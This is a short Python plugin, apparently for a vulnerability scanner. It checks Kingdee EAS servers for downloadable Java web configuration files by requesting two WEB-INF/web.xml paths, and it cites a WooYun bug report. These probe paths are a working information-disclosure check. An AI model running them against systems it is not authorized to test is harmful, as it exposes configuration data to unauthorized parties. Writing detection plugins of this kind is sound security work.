#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:金蝶AES系统2种Java web配置文件可下载
#Refer:http://www.wooyun.org/bugs/wooyun-2014-083323

def assign(service,arg):
    if service=="kingdee_eas":
        return True,arg



def  audit(arg):
    #第一种
    url=arg+"portal/WEB-INF/web.xml"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "<web-app" in res and '<param-name>' in res:
        security_hole(url)
        return arg
    #第二种
    url=arg+"eassso/WEB-INF/web.xml"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "<web-app" in res and '<param-name>' in res:
        security_hole(url)


        return arg
if __name__== '__main__':
    from dummy import *
